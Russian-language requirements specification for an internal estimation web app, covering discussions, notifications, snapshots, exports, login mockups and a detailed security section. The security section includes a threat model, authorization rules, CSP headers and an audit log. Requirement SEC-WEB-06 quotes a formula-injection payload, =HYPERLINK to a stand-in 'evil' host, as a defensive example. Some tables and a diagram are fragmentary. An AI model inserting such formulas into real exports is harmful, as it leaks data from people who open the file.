**FR-DISC-05.** Закрыть («Решено») вопрос могут автор вопроса, любой из адресатов, модератор; вопрос заказчику закрывают пресейл и модератор (BR-CQ-02). При закрытии предлагается «Добавить вывод в комментарий листа»: подставляется последнее сообщение, его можно править и выбрать метку. Закрытое обсуждение свёрнуто в одну строку «Решено: <начало вывода> · кто, когда».

**FR-DISC-06.** Автор правит своё сообщение, пока на него никто не ответил (метка «изменено»). Удалить нельзя. «Отозвать» скрывает текст, оставляет пометку «Сообщение отозвано автором»; модератор видит исходный текст в истории. **Почему нельзя удалять:** ответы других потеряют смысл, а для разбора спорных оценок нужна полная переписка.

**FR-DISC-07.** События в ленте: при изменении O/R/P, ×N, комментария, типа, переноса узла, у которого есть хотя бы одно сообщение, в ленту автоматически добавляется серая строка: «И. Иванов изменил O/R/P 8–12–20 → 12–16–30 · 03.11 14:20». Если сообщений нет — событие пишется только в историю (чтобы не создавать ленты из одних событий).

**FR-DISC-08.** Все участники проекта видят все обсуждения проекта ([Решение Q-03]). Личных переписок нет. Для внутренних соображений о цене и переговорах у модераторов, пресейла и руководителя пресейла есть закрытые заметки (FR-NOTE-01), которых эксперты не видят.

### 9.3. Вопросы заказчику

**FR-CQ-01.** Сообщение с адресатом `@заказчик` автоматически получает флаг «нужен ответ» и статус «новый», попадает в список «Вопросы заказчику». Статусы: `new` (новый), `sent` (отправлен), `answered` (отвечен), `closed` (решён), `withdrawn` (снят); переходы — диаграмма 4.4.

**FR-CQ-02.** Список (в статистике): номер вопроса (сквозной в проекте: В-001, В-002…; номер выдаётся атомарно из счётчика проекта при создании, снятые вопросы номер сохраняют, номера повторно не используются), текст, фаза → дисциплина → путь узла, автор, дата, статус, дата ответа. Фильтры по статусу, дисциплине. Пресейл и модератор выбирают вопросы и нажимают «Выгрузить в Excel» или «Выгрузить в Word»; выгруженные «новые» становятся «отправлен», с датой отправки.

**FR-CQ-03.** Ответ заказчика вносится в тот же вопрос кнопкой «Внести ответ заказчика» (пресейл или модератор): сообщение помечается «Ответ заказчика · внёс П. Сидоров», статус → «отвечен», автор вопроса получает уведомление. Отредактировать или снять вопрос в статусе «отправлен» могут только пресейл и модератор (BR-CQ-01).

**FR-CQ-04.** Выгрузка в Word: шапка (проект, заказчик, дата), таблица «№, раздел, вопрос, ответ (пустая колонка)». Ничего о деньгах и внутренних обсуждениях в выгрузку не попадает.

### 9.4. Уведомления

**FR-NOTIF-01.** В приложении: счётчик в верхней полосе и на «Моих оценках»; выпадающий список «Мне» — вопросы мне, ответы на мои вопросы, изменения модератора в моих листьях, моя ветка вернулась в черновик (BR-BR-02), назначение в проект и замена участника (FR-ADM-05). Модераторам дополнительно: ветка вернулась в черновик, участник проекта заблокирован, руководитель пресейла вошёл модератором, администратор открыл проект в режиме поддержки (FR-ADM-06). Администраторам — проект остался без модератора (BR-PRJ-07). Клик ведёт прямо к строке и раскрывает обсуждение.

**FR-NOTIF-02.** Почта:

- **Ежедневная сводка** (время по умолчанию 09:00, меняет суперадминистратор) — только если есть новые события с прошлого письма: «Вам 3 вопроса по 2 проектам». Отключается в профиле.
- **Быстрые письма о вопросах** ([Решение Q-45]): «вопрос мне» и «ответ на мой вопрос» собираются в пачку за 15 минут и уходят одним письмом. Отключаются в профиле отдельно от сводки.
- **Служебные письма** (отключить нельзя): назначение в проект, ссылка установки пароля, сброс пароля, вход с нового устройства. Письмо о входе с нового устройства получают все, кто видит деньги, — суперадминистраторы, администраторы, руководитель пресейла, модераторы и пресейл проектов; экспертам его не отправляют ([Решение Q-12]). Новое устройство — сочетание браузера и подсети /24, с которого пользователь не входил последние 90 дней.
- **Оповещения ИБ** (SEC-AUTH-07) уходят на адрес ИБ из настроек и всем администраторам.

**FR-NOTIF-03.** Письма содержат только название проекта, счётчики событий и ссылку в приложение ([Решение Q-37]); в них нет денег, оценок, названий узлов и текста сообщений. **Почему:** почта выходит за периметр приложения (пересылка, мобильные клиенты), а в теле письма достаточно повода зайти.

### 10.2. Снимки

**FR-SNAP-01.** Модератор создаёт снимок: название (обязательно, до 100 символов, например «v1 — КП отправлено»), описание (до 1 000 символов). Снимок хранит полное дерево, расчётные значения, настройки проекта (процент УП и база УП, уровень, фазы, «Цифра для КП», срок в неделях), ставки, валюту, курс, ставку НДС, денормализованные названия справочников, комментарии (без обсуждений), список открытых вопросов заказчику на момент снимка.

**FR-SNAP-02.** Снимок неизменяем: правка и удаление невозможны (только модератор может пометить снимок «ошибочный», он остаётся в списке зачёркнутым).

**FR-SNAP-03.** Сравнение «текущее ↔ снимок» или «снимок ↔ снимок»: таблица изменённых узлов (добавлен / удалён / изменён / перемещён) с ΔE по узлу и по итогам, автор последнего изменения. Эксперты видят разницу только в часах, модератор и пресейл — и в деньгах (включая влияние изменения курса и ставок отдельной строкой).

**FR-SNAP-04.** Узлы сопоставляются по внутреннему идентификатору узла (а не по названию), поэтому переименование показывается как «изменён», а не «удалён + добавлен».

**FR-SNAP-05.** Кнопка «Экспорт сравнения в Excel» выгружает таблицу сравнения FR-SNAP-03 с теми же правилами видимости денег и с отметками FR-EXP-06.

### 10.3. Экспорт

**FR-EXP-01.** Excel «Часы» (все участники): лист «Оценка» — дерево с отступами в колонке названия и колонкой уровня (для группировки Excel), тип, ×N, O, R, P, E, σ, комментарий, метка, статус ветки, «Проверено»; итоговые строки по фазам, УП, итог E и P80; лист «Допущения и риски»; лист «Параметры» (уровень, процент УП, дата выгрузки, кто выгрузил, версия или название снимка).

**FR-EXP-02.** Excel «С деньгами» (роли с деньгами): то же плюс колонки «Ставка», «Стоимость, ₽», «Стоимость, валюта КП», лист «Стоимость по дисциплинам» с итогом без НДС, строками «НДС N%» и «Итого с НДС», «Цифра для КП» (часы и деньги) и «Срок, недель»; курс, валюта и ставка НДС — в «Параметрах». Суммы столбцов сходятся с итогами до рубля (BR-MONEY-04).

**FR-EXP-03.** Экспорт можно сделать из текущего состояния или из любого снимка. Имя файла: `<Название проекта>_<снимок или дата>_<часы|деньги>.xlsx` (недопустимые символы заменяются на `_`).

**FR-EXP-04.** Значения в ячейках Excel пишутся как значения, а не формулы. Текстовые ячейки, начинающиеся с `=`, `+`, `-`, `@`, табуляции, получают префикс `'` (SEC-WEB-06).

**FR-EXP-05.** Экспорт формируется фоновой задачей; если дольше 3 секунд — пользователь видит «Готовим файл…», файл скачивается, когда готов. Файл хранится 24 часа и доступен только пользователю, который его запросил.

**FR-EXP-06.** Отметки на выгрузках ([Решение Q-36]): каждый файл (Excel, Word) содержит в колонтитуле и на первом листе гриф «Коммерческая тайна», ФИО выгрузившего и дату и время выгрузки. Каждая выгрузка пишется в аудит (кто, проект, вид выгрузки, снимок). Выгрузка «Часы» всего проекта доступна всем участникам.

### 10.4. Реестр и сводка по портфелю (руководитель пресейла)

**FR-PORT-01.** Руководитель пресейла ([Решение Q-31]) видит реестр всех проектов: название, заказчик, модераторы, пресейл, статус, «Цифра для КП» в часах и в валюте КП, итог в рублях без НДС, результат пресейла, сумма договора, дата последнего изменения. Фильтры по статусу, результату, модератору, периоду.

**FR-PORT-02.** Сводка по портфелю за выбранный период: число проектов по статусам и результатам, сумма оценок по выигранным и проигранным, доля выигранных (по числу и по деньгам), распределение причин проигрыша, отношение суммы договора к «Цифре для КП» по выигранным проектам. Сводка выгружается в Excel с отметками FR-EXP-06.

**FR-PORT-03.** Кнопка «Стать модератором проекта» добавляет руководителя пресейла в команду модератором; действующие модераторы получают уведомление, действие пишется в аудит.

## 11. Макеты экранов

### Как читать макеты

- Макет показывает **состав, расположение и поведение** элементов экрана. Отдельного дизайнера и корпоративного стандарта нет: визуальной основой интерфейса служат сами макеты и их стили (`mockups-src/app.css`) поверх компонентов Mantine ([Решение Q-10]). Расположение и набор элементов — требование.
- Картинки сделаны для версии 0.2. Элементы, добавленные в 0.3 (P90, «Цифра для КП», НДС, срок, документы заказчика, закрытые заметки, самопроверка), описаны в таблицах под картинками. Если картинка расходится с текстом, прав текст.
- Синие квадраты с цифрами (выноски) на картинке не часть интерфейса. Под каждой картинкой — таблица с расшифровкой выносок и ссылками на требования.
- Все цифры на макетах взяты из сквозного примера раздела 6.5 (проект «Портал дилеров»), поэтому их можно сверять с расчётами. Исключение оговорено у макета сравнения со снимком.
- Цветовые обозначения общие для всех экранов:

| Цвет на макете | Значение |
|---|---|
| Зелёный | Готово, проверено, ответ заказчика |
| Жёлто-оранжевый | Черновик, открытый вопрос, предупреждение |
| Красный | Ошибка, пустая или неверная оценка, вопрос лично мне |
| Фиолетовый с замком 🔒 | Деньги. Этот элемент видят **только роли с деньгами** (BR-MONEY-01) |
| Оранжевая рамка с инициалами | Ячейку сейчас редактирует другой пользователь |
| Серая штриховка | Ветка «не нужно» |

Исходники макетов (HTML) лежат рядом со спецификацией в папке `mockups-src/`, картинки — в `img/`.

### 11.1. Вход и второй фактор

![Экран входа: режим AD, режим «Приложение» с ошибкой, ввод кода TOTP](img/login.png)

На картинке три состояния одного экрана. Какое из них видит пользователь, зависит от способа аутентификации, который выбрал суперадминистратор.

| № | Элемент | Поведение и правила |
|---|---|---|
| 1 | Поле «Логин» | В режиме AD — логин Windows (`sAMAccountName`) или UPN, по настройке. Регистр не важен. Фокус ставится в это поле при открытии страницы |
| 2 | Кнопка «Войти» | Неактивна, пока пусто хотя бы одно поле (FR-LOCK-05). Enter в поле пароля = нажатие. Во время проверки на кнопке индикатор, повторное нажатие игнорируется |
| 3 | Подсказка режима AD | Видна только в режиме AD. Ссылки «Забыли пароль?» в этом режиме нет: пароль меняется средствами компании |
| 4 | Сообщение об ошибке | Всегда одинаковое для неверного логина и неверного пароля (FR-LOCK-01, FR-AUTH-AD-13). Счётчика «Осталось попыток» нет: на картинке он лишний (FR-LOCK-05). При блокировке — «Учётная запись временно заблокирована, попробуйте через N минут». При недоступности AD — «Сервис аутентификации временно недоступен». Поле пароля после ошибки очищается |
| 5 | «Забыли пароль?» | Только в режиме «Приложение» (FR-AUTH-LOC-03) |
| 6 | Поле кода TOTP | 6 клеток, ввод цифр с автопереходом, вставка из буфера целиком. После шестой цифры код отправляется сам, без нажатия кнопки |
| 6а | Подключение TOTP | Если TOTP обязателен, но не подключён, после пароля показывается экран подключения: QR-код, секрет текстом, поле первого кода, затем 10 резервных кодов с кнопкой «Скачать» (FR-2FA-04) |
| 7 | «Использовать резервный код» | Заменяет клетки одним полем для 8-значного резервного кода. «Назад» возвращает на шаг логина (временный токен шага TOTP аннулируется) |

### 11.2. Админка суперадминистратора: способ аутентификации

![Настройка способа входа и Active Directory](img/sa-auth.png)

| № | Элемент | Поведение и правила |
|---|---|---|
| 1 | Меню раздела «Система» | Видно только суперадминистратору. Пункты: состояние системы (FR-SA-07), аутентификация, безопасность (политики паролей, сессий, блокировок, 2FA по ролям, сети), почта, сроки хранения, суперадминистраторы и администраторы, аудиторы ИБ, анонимизация пользователей, реестр проектов (только чтение, без денег), журнал аудита |
| 2 | Выбор способа входа | Один режим на всё приложение. Под переключателем постоянная подсказка о том, что суперадминистраторы входят локально (FR-SA-03). Переключение доступно только из «Приложения» в AD и запускает сценарий FR-AUTH-SW-01: сначала отчёт «сопоставлено / неоднозначно / не найдено», затем ручное решение по неоднозначным, затем подтверждение. Обратного переключателя в интерфейсе нет |
| 3 | Подключение к AD | Нешифрованного варианта нет в списке (FR-AUTH-AD-02). Пароль сервисной учётки после сохранения не показывается, только «изменить». «Проверить подключение» выполняет bind и поиск, результат с временем ответа пишется рядом |

### 11.9. Требования к интерфейсу в целом

**FR-UI-01.** Язык интерфейса — русский. Все тексты — в файлах локализации (i18n), даже если второго языка пока нет.

**FR-UI-02.** Формат чисел — русский: пробел как разделитель тысяч, запятая как десятичный. Даты — ДД.ММ.ГГГГ, время — ЧЧ:ММ по часовому поясу пользователя (поле `users.timezone`, выбирается в профиле; по умолчанию — часовой пояс приложения). В БД все моменты времени хранятся в UTC (`timestamptz`). Дедлайны, автоархивация, ежедневная сводка и ночные задачи считаются по часовому поясу приложения.

**FR-UI-03.** Минимальная ширина 1366 px. На более узких экранах — горизонтальная прокрутка дерева, верхняя полоса сжимается.

**FR-UI-04.** Доступность: контраст текста ≥ 4,5:1, все действия доступны с клавиатуры, у иконок есть `aria-label`, цвет не единственный носитель смысла (статусы дублируются символом).

**FR-UI-05.** Пустые состояния: каждый список и ветка без данных показывает подсказку, что делать («В ветке пока ничего нет. Нажмите + чтобы добавить модуль, экран или работу»).

| Персональные данные: ФИО, логин, email, IP в журналах | 152-ФЗ | Средний |
| Журнал аудита | Доказательная база при инцидентах | Высокий (целостность) |

### 12.2. Модель угроз (STRIDE, кратко)

| Угроза | Пример для приложения | Мера (требование) |
|---|---|---|
| **S**poofing — подмена личности | Подбор пароля; фишинг пароля суперадминистратора; кража cookie; пустой пароль или LDAP-инъекция в режиме AD | Блокировки и rate limit (FR-LOCK-01..05), TOTP по ролям (FR-SA-04, FR-2FA-02), проверки FR-AUTH-AD-13, HttpOnly/Secure cookie, CSP (SEC-WEB-03) |
| **T**ampering — подмена данных | Эксперт через API правит ветку чужой дисциплины; подмена значений в WebSocket | Серверная проверка прав на каждое действие (SEC-AUTHZ-01), валидация на сервере, версии узлов |
| **R**epudiation — отказ от действий | «Я не менял эту цифру» | История с автором на каждую правку, неизменяемый журнал аудита (SEC-AUD-*) |
| **I**nformation disclosure — утечка | Эксперт видит ставки в ответе API; IDOR — перебор `project_id`; деньги в письме | Фильтрация полей на сервере (SEC-AUTHZ-04), проверка членства в проекте, письма без данных (FR-NOTIF-03), 404 вместо 403 на чужие объекты |
| **D**enial of service | Массовые запросы, гигантское дерево, большие файлы | Rate limit, лимиты размеров (BR-TREE-05/06, NFR-LIM-01, FR-DOC-01), таймауты |
| **E**levation of privilege | Администратор выдаёт себе роль суперадминистратора; эксперт делает себя модератором; суперадминистратор подменяет SMTP | Роли меняются только ролями выше, step-up для критичных действий, администратор и суперадминистратор не выдаются через AD (FR-AUTH-AD-07), оповещения по старому каналу (SEC-AUTH-07) |

### 12.3. Аутентификация

**SEC-AUTH-01.** Хэширование локальных паролей — Argon2id (библиотека `argon2-cffi`), параметры не ниже: память 64 МиБ, итераций 3, параллелизм 1–4; параметры хранятся в строке хэша, при входе с устаревшими параметрами хэш пересчитывается. bcrypt/MD5/SHA-* без соли запрещены.

**SEC-AUTH-02.** Сравнение секретов (токены сброса, коды) — только функциями постоянного времени (`hmac.compare_digest`).

**SEC-AUTH-03.** Токены сброса и активации: 256 бит из `secrets`, в БД хранится только SHA-256 токена, одноразовые, со сроком действия.

**SEC-AUTH-04.** Пароли, токены, коды TOTP, cookie сессий **НЕ ДОЛЖНЫ** попадать в журналы приложения, журналы веб-сервера, сообщения об ошибках, трассировки (настроены фильтры логгера по именам полей `password`, `token`, `secret`, `code`, `cookie`, `authorization`).

**SEC-AUTH-05.** Step-up (повторный ввод пароля и TOTP, действует 5 минут; для пользователей AD — пароль AD и TOTP) требуется для: смены способа аутентификации и параметров AD, изменения SMTP, создания и разжалования суперадминистратора, администратора, аудитора ИБ, изменения политик безопасности и сроков хранения, выгрузки журнала аудита, сброса пароля или 2FA другому пользователю, анонимизации пользователя.

**SEC-AUTH-06.** Вход с нового устройства (новая пара «браузер + подсеть /24») порождает письмо-уведомление всем, кто видит деньги: суперадминистраторам, администраторам, руководителю пресейла, модераторам и пресейлу проектов; экспертам — нет ([Решение Q-12], FR-NOTIF-02).

**SEC-AUTH-07.** Оповещения ИБ ([Решение Q-26]). Немедленное письмо всем администраторам и на адрес ИБ из настроек, плюс запись в аудит и событие в SIEM, при: смене SMTP, смене режима входа или параметров AD, создании, разжаловании и сбросе пароля/TOTP суперадминистратора или администратора, выдаче и снятии роли «Аудитор ИБ», отключении обязательного TOTP для роли, изменении сетевых ограничений, 5 неудачных входах подряд по логину суперадминистратора (FR-LOCK-04), сбое проверки цепочки аудита (SEC-AUD-03). При смене SMTP письмо уходит через **старый** сервер (до применения изменения), а затем — через новый. Если отправить через старый не удалось, изменение всё равно применяется, а в «Состоянии системы» и SIEM фиксируется «оповещение не доставлено». **Почему:** двойного контроля нет, поэтому злоупотребление должно быть сразу заметно независимым людям.

### 12.4. Авторизация

**SEC-AUTHZ-01.** Проверка прав выполняется **на сервере** на каждый HTTP-запрос и каждое входящее WebSocket-сообщение. Скрытие кнопок на клиенте — только удобство, не мера безопасности.

**SEC-AUTHZ-02.** Политика «запрещено по умолчанию»: каждый эндпоинт явно объявляет требуемое право (декоратор/зависимость FastAPI). Эндпоинт без объявленного права не проходит автотест «все маршруты защищены» (TC-SEC-01) и не попадает в сборку.

**SEC-AUTHZ-03.** Доступ к объекту проекта (узлу, сообщению, снимку, экспорту) проверяется по цепочке «объект → проект → членство пользователя → роль → дисциплина». Идентификаторы объектов — UUID v7, но **непредсказуемость идентификатора не считается мерой защиты**. На объект чужого проекта сервер отвечает 404, а не 403 (не раскрывает существование).

**SEC-AUTHZ-04.** Деньги изолированы на уровне данных и API:

- ставки, курс, НДС и сумма договора хранятся в отдельных таблицах `project_money` и `project_rates`;
- для денег отдельные эндпоинты (`/api/v1/projects/{id}/money`) с правом `money.read` (чтение) и `money.write` (правка);
- закрытые заметки — отдельные эндпоинты с правом `notes.read`, которого нет у экспертов и ревьюеров;
- в общих ответах (дерево, статистика, снимки, экспорт, события WebSocket) денежные поля **отсутствуют** для пользователей без права (не `null`, а нет ключа);
- события WebSocket с деньгами публикуются в отдельный канал `project:{id}:money`, подписаться на который может только пользователь с `money.read`;
- снимок хранит деньги в отдельном поле, которое при выдаче эксперту не сериализуется.

```mermaid
flowchart LR
    REQ["Запрос эксперта<br/>GET /projects/42/tree"] --> AUTHN{"Сессия валидна?"}
    AUTHN -- нет --> R401["401"]
    AUTHN -- да --> MEMB{"Участник проекта 42?"}
    MEMB -- нет --> R404["404"]
    MEMB -- да --> PERM{"Право tree.read"}
    PERM -- да --> SER["Сериализатор по роли"]
    SER --> MONEY{"Право money.read?"}
    MONEY -- нет --> OUT1["Ответ без денежных полей"]
    MONEY -- да --> OUT2["Ответ + деньги"]
```

**SEC-AUTHZ-05.** Пример матрицы проверок записи, которую ДОЛЖЕН покрыть автотест (полный перебор роль × действие × принадлежность ветки):

| Кто | Действие | Ветка | Ожидание |
|---|---|---|---|
| Эксперт Бэкенда | PATCH O/R/P листа | Бэкенд | 200 |
| Эксперт Бэкенда | PATCH O/R/P листа | Фронтенд | 403 |
| Эксперт Бэкенда | Перенос своего листа в ветку Фронтенда | — | 403 |
| Эксперт Бэкенда | GET /api/v1/projects/42/money | — | 403 |
| Эксперт Бэкенда | GET /api/v1/projects/42/notes | — | 403 |
| Эксперт другого проекта | GET /api/v1/projects/42/tree | — | 404 |
| Пресейл | PATCH O/R/P любого листа | — | 403 |
| Администратор (не участник, без режима поддержки) | GET /api/v1/projects/42/tree | — | 404 |
| Администратор в режиме поддержки | GET /api/v1/projects/42/money | — | 403 |
| Администратор в режиме поддержки | PATCH O/R/P листа | — | 403 |
| Руководитель пресейла (не участник) | GET /api/v1/projects/42/money | — | 200 |
| Руководитель пресейла (не участник) | PATCH O/R/P листа | — | 403 |

| Суперадминистратор | GET /api/v1/projects/42/tree | — | 404 |

**SEC-AUTHZ-06.** Изменение системных ролей: администратор не может выдать или снять роль «Администратор» и «Аудитор ИБ» (только суперадминистратор). Никто не может менять собственные системные роли. Назначение администратором себя или созданной им учётки в проект разрешено и журналируется особой пометкой (BR-ADM-03).

### 12.5. Защита веб-приложения

**SEC-WEB-01.** Приложение доступно только из офисной сети и через VPN; из интернета оно не публикуется ([Решение Q-35]). Только HTTPS. TLS 1.2 и 1.3, наборы шифров по профилю Mozilla «intermediate». HTTP → 301 на HTTPS. HSTS `max-age=31536000; includeSubDomains`.

**SEC-WEB-02.** Весь пользовательский текст (названия, комментарии, сообщения, ФИО из AD) выводится как текст: React экранирует по умолчанию; использование `dangerouslySetInnerHTML` запрещено правилом линтера. Автоссылки строятся компонентом, допускаются только схемы `http` и `https`.

**SEC-WEB-03.** Заголовки ответа:

```text
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'nonce-<случайный>';
    img-src 'self' data:; connect-src 'self' wss://<host>; frame-ancestors 'none';
    base-uri 'none'; form-action 'self'; object-src 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
Cache-Control: no-store                      (для всех ответов /api/*)
```

Фронтенд собирается без inline-скриптов, внешние CDN не используются (все зависимости в сборке). Mantine (Emotion) вставляет теги `<style>` во время работы, поэтому сервер генерирует nonce на каждый ответ с HTML, подставляет его в CSP и в `<meta name="csp-nonce">`, а клиент передаёт его в кэш Emotion. `'unsafe-inline'` для стилей не используется; проверка — в чек-листе 17.3. **Почему:** внутреннее приложение не должно зависеть от доступности и честности внешних CDN.

**SEC-WEB-04.** CSRF: cookie `SameSite=Strict` + заголовок `X-CSRF-Token` (значение из отдельной не-HttpOnly cookie, сравнивается с привязанным к сессии) на все изменяющие запросы. WebSocket при подключении проверяет заголовок `Origin` по списку разрешённых.

**SEC-WEB-05.** CORS выключен (фронтенд и API на одном домене). SQL — только через ORM/параметризованные запросы; сырые SQL-строки с подстановкой значений запрещены правилом линтера (bandit/semgrep).

**SEC-WEB-06.** Защита от формульных инъекций в Excel/CSV: текстовые значения, начинающиеся с `=`, `+`, `-`, `@`, `\t`, `\r`, экранируются префиксом `'`. **Пример:** эксперт пишет комментарий `=HYPERLINK("http://evil/?"&A1;"Подробнее")`; без экранирования модератор, открыв выгрузку, может отправить данные на чужой сервер.

**SEC-WEB-07.** Ограничение частоты (на пользователя): 300 изменяющих запросов в минуту, 30 экспортов в час, 60 сообщений в обсуждениях в минуту. Превышение — 429 с заголовком `Retry-After`.

**SEC-WEB-08.** Ограничения размеров: тело запроса ≤ 1 МБ (кроме загрузки сертификата УЦ ≤ 64 КБ, производственного календаря ≤ 256 КБ и документов заказчика ≤ 50 МБ), WebSocket-сообщение ≤ 64 КБ, длины полей — по NFR-LIM-01.

**SEC-WEB-10.** Загрузка файлов (FR-DOC-01): тип определяется по сигнатуре содержимого (разрешены PDF, DOCX, XLSX; макросы `.docm`/`.xlsm` запрещены), файл сначала попадает в карантин и проверяется антивирусом ClamAV (контейнер `clamav` в поставке); заражённый или непроверенный файл не выдаётся и удаляется, загрузивший видит причину, событие пишется в аудит и SIEM. Имя файла при хранении заменяется на UUID; при скачивании отдаётся с `Content-Disposition: attachment` и `X-Content-Type-Options: nosniff`.

**SEC-WEB-09.** Сообщения об ошибках пользователю не содержат трассировок, SQL, версий библиотек. Каждая ошибка 5xx имеет `error_id`, по которому её находят в логах.

### 12.6. Криптография и секреты

**SEC-CRYPT-01.** Секреты приложения (ключ шифрования, пароль БД, пароль Redis, SMTP) передаются через переменные окружения или файлы Docker secrets; в репозитории и образах их нет. Ключ шифрования — 256 бит.

**SEC-CRYPT-02.** Поддержка ротации ключа шифрования: в зашифрованном значении хранится идентификатор ключа; консольная команда `estimator rotate-key` перешифровывает значения.

**SEC-CRYPT-03.** Шифруются на уровне приложения (AES-256-GCM, библиотека `cryptography`): секреты TOTP, пароль сервисной учётки AD, пароль SMTP.

**SEC-CRYPT-06.** Документы заказчика хранятся на диске зашифрованными на уровне приложения (AES-256-GCM, отдельный ключ данных на файл, зашифрованный мастер-ключом), ключ хранится вне тома с файлами.

**SEC-CRYPT-07.** Ключи ([Решение Q-48]): рабочие ключи (мастер-ключ шифрования, ключ шифрования бэкапов) хранит служба эксплуатации ИТ. Запечатанная копия каждого ключа (распечатка или носитель в опечатанном конверте) лежит в сейфе службы ИБ; вскрытие конверта оформляется актом. При ротации ключа копия в сейфе заменяется в тот же день.

**SEC-CRYPT-04.** Шифрование данных на диске (PostgreSQL, резервные копии) — средствами инфраструктуры (шифрование тома / зашифрованное хранилище бэкапов). Сертификация ФСТЭК и СКЗИ не требуется ([Решение Q-06]). Резервные копии дополнительно шифруются при создании (`age` или `gpg`), ключ хранится отдельно от копий.

**SEC-CRYPT-05.** Соединения внутри контура: приложение ↔ PostgreSQL — TLS (`sslmode=verify-full`), приложение ↔ Redis — пароль (ACL) и TLS, если Redis на другом хосте.

### 12.7. Журнал аудита

**SEC-AUD-01.** Журналируемые события (минимум):

| Категория | События |
|---|---|
| Аутентификация | Успешный вход, неуспешный вход (с причиной: нет пользователя, неверный пароль, заблокирован, не в группе AD, неверный TOTP, пустой пароль), выход, истечение сессии, блокировка по попыткам, растущая задержка для суперадминистратора, сброс и смена пароля, подключение и сброс 2FA, завершение сессий, отзыв сессий проверкой AD (FR-AUTH-AD-08) |
| Пользователи и роли | Создание (в т. ч. заведение из каталога AD), блокировка, разблокировка (с причиной `block_reason`), анонимизация, изменение системных ролей, синхронизация AD (сводка), замена участника во всех проектах |
| Система | Шаги мастера первичной настройки; смена способа аутентификации (с отчётом сопоставления), изменение настроек AD, политик, SMTP, сетей, сроков хранения; создание/разжалование администраторов, суперадминистраторов, аудиторов ИБ; запуск любой консольной команды (`create-superadmin`, `issue-activation`, `reset-superadmin`, `auth-mode`, `rotate-key`, `audit purge`, `project purge`) — с именем пользователя ОС; результат ежедневной проверки цепочки аудита |
| Справочники | Любое изменение со значениями «было → стало» |
| Проекты | Создание, смена статуса (в т. ч. автоархивация), изменение команды и ролей в проекте (с пометкой «администратор назначил себя / свою учётку»), вход руководителя пресейла модератором, открытие в режиме поддержки (с причиной), изменение ставок/валюты/курса/НДС (только факт изменения, без сумм — см. уточнение ниже), снимок и пометка снимка «ошибочный», создание и скачивание экспорта (вид, кто), загрузка, скачивание и удаление документов заказчика, передача модератора, физическое удаление |
| Безопасность | Отказ в доступе 403/404 на объекты проекта (агрегированно: не чаще 1 записи в минуту на пользователя и объект), отказ по сетевому ограничению (FR-SA-06), превышение rate limit, заражённый файл |
| Аудит | Просмотр журнала аудита (фильтры), выгрузка журнала |

**SEC-AUD-02.** Поля записи: время (UTC, мкс), тип события, результат, пользователь (id и логин на момент события), IP, User-Agent, идентификатор сессии (хэш), объект (тип, id), детали (JSON без секретов), `prev_hash`, `hash`.

**SEC-AUD-03.** Неизменяемость: таблица `audit_log` — только INSERT. Роль БД приложения не имеет прав `UPDATE`, `DELETE`, `TRUNCATE` на неё (отдельная схема, права выдаются миграцией). Каждая запись содержит `hash = SHA-256(prev_hash ‖ канонический JSON записи)`. Канонический JSON — поля SEC-AUD-02 без `hash`, ключи по алфавиту, UTF-8, без пробелов, время в ISO 8601 UTC с микросекундами (RFC 8785). Запись выполняется функцией в одной транзакции под `pg_advisory_xact_lock` с фиксированным ключом: она читает последний `hash`, вычисляет новый и вставляет запись, поэтому несколько экземпляров API и Celery не ломают цепочку. Команда `estimator audit verify` проверяет цепочку; Celery запускает её ежедневно в 04:00, при расхождении — оповещение ИБ (SEC-AUTH-07) и красный индикатор в «Состоянии системы».

**SEC-AUD-04.** Хранение — 1 год по умолчанию (настраивает суперадминистратор, минимум 6 месяцев; [Решение Q-38], полный список сроков — NFR-REL-06). Удаление старых записей — консольной командой с отдельной ролью БД, с сохранением хэша последней удалённой записи (якорь цепочки).

**SEC-AUD-05.** Экспорт в SIEM входит в MVP ([Решение Q-39]): каждое событие аудита отправляется в syslog (RFC 5424, TCP+TLS, тело — JSON одной строкой) на адрес SIEM из настроек суперадминистратора и дублируется в stdout. Если SIEM недоступен, события копятся в очереди (до 100 000) и досылаются; переполнение очереди — красный индикатор в «Состоянии системы».

**SEC-AUD-06.** Просмотр аудита: суперадминистратор и аудитор ИБ ([Решение Q-27]) — всё, включая действия суперадминистраторов; администратор — категории «Справочники» и «Пользователи и роли». Фильтры: период, пользователь, тип события, результат. Выгрузка в CSV — со step-up.

> Уточнение к SEC-AUD-01 «Проекты»: в журнал пишется **факт** изменения ставок и курса (кто, когда, какой проект, какая дисциплина), но **не значения**. **Почему:** журнал читают суперадминистратор и аудитор ИБ, которым деньги видеть не положено (раздел 3.2). Значения ставок остаются в истории проекта, доступной модераторам.

### 12.8. Персональные данные

**SEC-PD-01.** Состав ПДн: ФИО, логин, корпоративный email, IP-адреса и User-Agent в журналах. Других ПДн (телефоны, паспортные данные) приложение не собирает; поля для них не создаются.

**SEC-PD-02.** Приложение — внутренняя система компании; основание обработки — трудовые отношения. Уведомление Роскомнадзора и локальные акты — ответственность компании, а не приложения.

**SEC-PD-03.** «Анонимизация» пользователя (только суперадминистратор, со step-up, только для заблокированных, [Решение Q-34]): ФИО → «Удалённый пользователь #<номер>», логин и email → случайные значения, сессии и 2FA удаляются. Авторство в проектах сохраняется в обезличенном виде. IP в журнале аудита не стирается до истечения срока хранения (требование расследования инцидентов). Связь с AD (`ad_object_guid`) удаляется, поэтому новый вход того же человека через AD создаёт новую учётку.

### 12.9. Безопасная разработка

**SEC-SDLC-05.** Перед вводом в промышленную эксплуатацию служба ИБ компании проверяет приложение по чек-листу 17.3 и сканированием OWASP ZAP. Внешнего пентеста нет ([Решение Q-11]).

### 13.3. Совместная работа: как событие доходит до всех

```mermaid
sequenceDiagram

    participant P1 as FastAPI #1
    participant DB as PostgreSQL
    participant R as Redis pub/sub
    participant P2 as FastAPI #2
    participant B as Браузер эксперта Б

    P1->>P1: Проверка прав, валидация, версия

    B->>B: Пересчёт сумм вверх по дереву локально
```

**ARCH-01.** Изменения отправляются по REST (HTTPS), а не через WebSocket. WebSocket — только канал уведомлений «сервер → клиент» и мягких блокировок. **Почему:** у REST простые и проверенные механизмы CSRF, rate limit, журналирования и повторов; WebSocket используется там, где он действительно нужен.

